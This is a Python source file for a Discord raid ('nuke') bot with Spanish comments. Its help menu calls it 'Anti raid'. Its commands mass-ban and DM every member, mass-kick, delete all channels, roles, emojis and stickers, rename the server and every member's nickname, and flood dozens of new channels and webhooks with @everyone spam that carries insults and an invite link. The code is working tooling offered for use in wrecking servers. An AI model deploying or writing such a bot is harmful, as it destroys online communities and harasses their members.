import discord
from discord.ext import commands
import asyncio
import logging
import os
import random
from datetime import datetime

# Configuración de logging optimizada para monitoreo
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

PREFIX = "!"
TOKEN = os.getenv("DISCORD_TOKEN") or "TU_TOKEN_AQUI"

# El banner animado de Discord configurado de forma global
GIF_URL = "https://cdn.discordapp.com/banners/1334323253992361986/a_1da916f82737a9ca0084c939821aaba7.webp?size=2048&animated=true"

# ================= VARIABLES GLOBALES OPTIMIZADAS =================
# Cambiado a un diccionario para separar los contadores por servidor (Guild)
ejecuciones_por_servidor = {}  
MAX_EJECUCIONES = 2
tiempo_inicio = datetime.now()

# Configuración explícita de los Intents necesarios
intents = discord.Intents.default()
intents.members = True  
intents.messages = True  
intents.message_content = True  

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@bot.event
async def on_ready():
    global tiempo_inicio
    tiempo_inicio = datetime.now()
    logging.info(f"⚡ MacHUB Engine Conectado: {bot.user.name} (ID: {bot.user.id})")


# ================= FUNCIÓN AUXILIAR PARA EL EMBED DE !eje =================
def generar_embed_eje(guild_id):
    global ejecuciones_por_servidor, MAX_EJECUCIONES
    
    # Si el servidor no está en el diccionario, empieza en 0
    actuales = ejecuciones_por_servidor.get(guild_id, 0)
    
    # Color estético del Embed según el uso del servidor
    if actuales == 0:
        color = discord.Color.green()
    elif actuales == 1:
        color = discord.Color.orange()
    else:
        color = discord.Color.red()
    
    embed = discord.Embed(
        title="📊 CONTROL DE EJECUCIONES",
        description=f"**Ejecuciones del bot en este servidor:** `{actuales}/{MAX_EJECUCIONES}`",
        color=color
    )
    embed.set_footer(text="MacHUB Engine • Monitoreo por servidor")
    embed.timestamp = datetime.now()
    return embed


# ================= COMANDO !eje (INDIVIDUAL POR SERVIDOR) =================
@bot.command()
async def eje(ctx):
    if not ctx.guild: return  # Evita que se use en mensajes directos (DM)
    
    embed = generar_embed_eje(ctx.guild.id)
    try:
        await ctx.send(embed=embed)
    except:
        pass


# ================= 1. COMANDO BANPRO =================
@bot.command()
async def banpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.ban_members: return
    if not ctx.guild.me.guild_permissions.ban_members: return
    
    mensaje_dm = f"Mi bot te baneo de tu servidor 😂 quieres hacerlo? Unete aqui https://discord.gg/aACMXB4HSp\n{GIF_URL}"
    
    targets = [
        member for member in ctx.guild.members 
        if not member.bot and member.id != ctx.author.id and member.top_role < ctx.guild.me.top_role
    ]
    
    if len(targets) == 0: return

    chunk_size = 15
    for i in range(0, len(targets), chunk_size):
        chunk = targets[i:i + chunk_size]
        
        async def process_member(member):
            try: await member.send(mensaje_dm)
            except: pass
            try: await member.ban(reason="Baneo masivo By Mac.")
            except: pass

        tasks = [process_member(m) for m in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.8)


# ================= 2. COMANDO RAIDEAR Y SPAM (rD) =================
@bot.command()
async def rD(ctx):
    global ejecuciones_por_servidor
    if not ctx.guild: return
    
    if not ctx.author.guild_permissions.manage_channels: return
    if not ctx.guild.me.guild_permissions.manage_channels: return

    # Obtener las ejecuciones exclusivas de este servidor
    actuales = ejecuciones_por_servidor.get(ctx.guild.id, 0)

    # 1. Control del límite de ejecuciones en este servidor específico
    if actuales >= MAX_EJECUCIONES:
        try: await ctx.send(f"❌ Límite alcanzado en este servidor ({actuales}/{MAX_EJECUCIONES}). No se pueden realizar más ejecuciones.")
        except: pass
        return

    # 2. Sumamos la ejecución al servidor actual de inmediato
    ejecuciones_por_servidor[ctx.guild.id] = actuales + 1

    channels_to_delete = list(ctx.guild.channels)
    for channel in channels_to_delete:
        try: await channel.delete()
        except: pass

    created_channels = []
    for _ in range(50):
        try:
            ch = await ctx.guild.create_text_channel(name="Mc R")
            created_channels.append(ch)
        except: pass

    msg_por_canal = 400 
    
    async def spam_task(channel):
        for _ in range(msg_por_canal):
            try:
                await channel.send(f"@everyone server raideado putos respeten a sus mayores https://discord.gg/aACMXB4HSp\n{GIF_URL}")
                await asyncio.sleep(0.1) 
            except discord.HTTPException as e:
                if e.status == 429: await asyncio.sleep(5)
                else: break

    tasks = [spam_task(ch) for ch in created_channels]
    await asyncio.gather(*tasks)


# ================= 3. EXPULSIÓN MASIVA =================
@bot.command()
async def kickpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.kick_members: return
    if not ctx.guild.me.guild_permissions.kick_members: return

    try: await ctx.send(GIF_URL)
    except: pass

    targets = [
        member for member in ctx.guild.members 
        if not member.bot and member.id != ctx.author.id and member.top_role < ctx.guild.me.top_role
    ]

    if len(targets) == 0: return

    chunk_size = 15
    for i in range(0, len(targets), chunk_size):
        chunk = targets[i:i + chunk_size]
        
        async def process_kick(member):
            try: await member.kick(reason="Limpieza Masiva By Mac.")
            except: pass

        tasks = [process_kick(m) for m in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.8)


# ================= 4. CAMBIAR IDENTIDAD DEL SERVIDOR =================
@bot.command()
async def rnServers(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_guild: return
    if not ctx.guild.me.guild_permissions.manage_guild: return

    try:
        await ctx.guild.edit(name="Mc R", description="Server dominado.")
        await ctx.send(GIF_URL)
    except:
        pass


# ================= 5. BORRAR TODOS LOS ROLES =================
@bot.command()
async def rolesD(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_roles: return
    if not ctx.guild.me.guild_permissions.manage_roles: return

    try: await ctx.send(GIF_URL)
    except: pass

    roles_to_delete = [
        role for role in ctx.guild.roles 
        if role.name != "@everyone" and role < ctx.guild.me.top_role and not role.is_bot_managed()
    ]

    for role in roles_to_delete:
        try: await role.delete(reason="Remoción de roles.")
        except: pass
        await asyncio.sleep(0.2)


# ================= 6. CREACIÓN MASIVA DE ROLES =================
@bot.command()
async def rolesC(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_roles: return
    if not ctx.guild.me.guild_permissions.manage_roles: return

    try: await ctx.send(GIF_URL)
    except: pass

    async def create_role_task():
        try:
            color_aleatorio = discord.Color(random.randint(0, 0xFFFFFF))
            await ctx.guild.create_role(name="Mc R", color=color_aleatorio)
        except:
            pass

    for i in range(0, 50, 10):
        tasks = [create_role_task() for _ in range(10)]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.5)


# ================= 7. SATURACIÓN DE CATEGORÍAS =================
@bot.command()
async def ccpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_channels: return
    if not ctx.guild.me.guild_permissions.manage_channels: return

    for channel in list(ctx.guild.channels):
        try: await channel.delete()
        except: pass

    async def create_category_task():
        try: await ctx.guild.create_category(name="Mc R")
        except: pass

    for i in range(0, 50, 10):
        tasks = [create_category_task() for _ in range(10)]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.4)


# ================= 8. CAMBIAR APODOS GLOBALMENTE =================
@bot.command()
async def nickpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_nicknames: return
    if not ctx.guild.me.guild_permissions.manage_nicknames: return

    try: await ctx.send(GIF_URL)
    except: pass

    targets = [
        m for m in ctx.guild.members 
        if m.id != ctx.guild.owner_id and m.top_role < ctx.guild.me.top_role
    ]

    chunk_size = 20
    for i in range(0, len(targets), chunk_size):
        chunk = targets[i:i + chunk_size]
        
        async def set_nick(member):
            try: await member.edit(nick="Mc R")
            except: pass

        tasks = [set_nick(m) for m in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.5)


# ================= 9. BORRAR EMOJIS Y STICKERS =================
@bot.command()
async def emojisD(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_expressions: return
    if not ctx.guild.me.guild_permissions.manage_expressions: return

    try: await ctx.send(GIF_URL)
    except: pass

    for emoji in list(ctx.guild.emojis):
        try: await emoji.delete()
        except: pass
    
    for sticker in list(ctx.guild.stickers):
        try: await sticker.delete()
        except: pass


# ================= 10. MULTI-WEBHOOK ATTACK =================
@bot.command()
async def hookpro(ctx):
    if not ctx.guild: return
    if not ctx.author.guild_permissions.manage_webhooks: return
    if not ctx.guild.me.guild_permissions.manage_webhooks: return

    channels = ctx.guild.text_channels
    if not channels: return

    async def launch_webhook(channel):
        try:
            webhook = await channel.create_webhook(name="Mc R Engine")
            for _ in range(25):
                await webhook.send(f"@everyone server Nuevo https://discord.gg/aACMXB4HSp\n{GIF_URL}", username="Mc R")
                await asyncio.sleep(0.2)
        except:
            pass

    tasks = [launch_webhook(ch) for ch in channels[:15]]
    await asyncio.gather(*tasks)


# ================= 11. COMANDO UPTIME =================
@bot.command()
async def uptime(ctx):
    try:
        delta_tiempo = datetime.now() - tiempo_inicio
        dias = delta_tiempo.days
        horas, rem = divmod(delta_tiempo.seconds, 3600)
        minutos, segundos = divmod(rem, 60)
        
        ping_ms = round(bot.latency * 1000)
        
        await ctx.send(
            f"📊 **Estado del bot:**\n"
            f"⏱️ **Tiempo activo:** `{dias}d {horas}h {minutos}m {segundos}s`\n"
            f"⚡ **Latencia (Ping):** `{ping_ms}ms`"
        )
    except:
        pass


# ================= 12. MENÚ DE AYUDA COMPLETO =================
@bot.command()
async def ayuda(ctx):
    menu = (
        "```\n"
        "=== Mc R Anti raid - cmds ===\n"
        "!uptime       -> Muestra el tiempo activo del bot y la latencia.\n"
        "!eje          -> Muestra el estado de ejecuciones del bot en vivo.\n"
        "!banpro       -> DM Masivo + Ban global a todos los miembros.\n"
        "!kickpro      -> Expulsa de inmediato a todos los miembros.\n"
        "!rD           -> elimina todo, crear 50 canales e inundar con 20k mensajes.\n"
        "!ccpro        -> elimina canales y crea 50 categorías para colapsar UI.\n"
        "!hookpro      -> Genera webhooks de spam ultra veloz por canal.\n"
        "!nickpro      -> Modifica el apodo de todos los usuarios a 'Mc R'.\n"
        "!rnServers    -> Cambia el nombre del servidor a 'Mc R'.\n"
        "!rolesD       -> Destruye todos los roles existentes del servidor.\n"
        "!rolesC       -> Genera 50 roles con colores arcoíris aleatorios.\n"
        "!emojisD      -> elimina los emojis y stickers personalizados.\n"
        "```"
    )
    try: 
        await ctx.send(menu)
    except: 
        pass


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound): return
    logging.error(f"Error: {error}")

bot.run(TOKEN)
    
